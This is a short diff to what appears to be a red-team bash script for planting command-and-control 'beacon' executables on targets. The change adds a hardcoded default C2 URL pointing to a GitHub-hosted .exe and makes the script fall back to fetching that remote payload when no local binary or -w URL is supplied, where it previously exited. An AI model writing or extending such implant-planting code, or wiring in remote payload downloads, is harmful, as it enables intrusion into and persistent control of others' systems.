@@ -128,13 +128,17 @@ else
   done
 fi
 
+# Default C2 URL — used when no local .exe and no -w specified
+DEFAULT_BEACON_URL="https://github.com/smsmartbyu/red-team-scripts/raw/refs/heads/main/test/REASONABLE_NICETY.exe"
+
 if [[ ${#BEACON_FILES[@]} -eq 0 ]]; then
   echo "[!] No .exe found in current directory"
   if [[ -z "$BEACON_URL" ]]; then
-    echo "[-] No binaries and no -w URL specified. Nothing to plant."
-    exit 1
+    BEACON_URL="$DEFAULT_BEACON_URL"
+    echo "[*] No -w URL specified — using default: $BEACON_URL"
+  else
+    echo "[*] Will rely on -w URL download only: $BEACON_URL"
   fi
-  echo "[*] Will rely on -w URL download only: $BEACON_URL"
   BEACON_FILES=("beacon.exe")  # placeholder name for URL-only mode
 fi
 
